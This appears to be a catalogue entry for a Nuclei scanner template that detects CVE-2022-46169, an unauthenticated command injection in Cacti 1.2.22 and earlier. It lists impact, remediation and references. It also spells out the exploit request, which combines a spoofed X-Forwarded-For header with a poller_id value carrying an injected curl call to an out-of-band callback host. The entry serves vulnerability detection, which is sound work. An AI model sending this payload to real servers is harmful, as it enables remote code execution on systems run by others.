---
cve_id: CVE-2022-46169
template_path: nuclei-templates/http/cves/2022/CVE-2022-46169.yaml
affected_product: Cacti
severity: critical
authentication: none
external_callback: true
affected_versions: <=1.2.22
preconditions: []
poc_classification: rce
---

## Vulnerability
Cacti through 1.2.22 is vulnerable to unauthenticated remote command injection (CVE-2022-46169). The remote_agent.php endpoint performs insufficient authorization when processing HTTP requests that include a spoofed X-Forwarded-For: 127.0.0.1 header, allowing an attacker to inject arbitrary OS commands via the poller_id parameter.  

**Impact**: Full remote code execution in the context of the Cacti process, enabling sensitive data access, data modification, and unauthorized administrative actions (CVSS 3.1: 9.8, vector AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).  
**Remediation**: Upgrade to 1.2.23 or later.  
**CWE**: CWE-78, CWE-74.

## PoC / Detection
Classification: rce  

The template issues a single raw GET request to `/remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=1&poller_id=;curl%20{{interactsh-url}}%20-H%20'User-Agent%3a%20{{useragent}}';` while setting the X-Forwarded-For header to 127.0.0.1. Detection succeeds if the server returns HTTP 200 with JSON fragments `"value":` and `"local_data_id":` in the body and an out-of-band HTTP interaction is received containing the randomized User-Agent string.

## References
- https://security-tracker.debian.org/tracker/CVE-2022-46169
- https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf
- https://www.cybersecurity-help.cz/vdb/SB2022121926
- https://nvd.nist.gov/vuln/detail/CVE-2022-46169
- https://github.com/Cacti/cacti/commit/7f0e16312dd5ce20f93744ef8b9c3b0f1ece2216
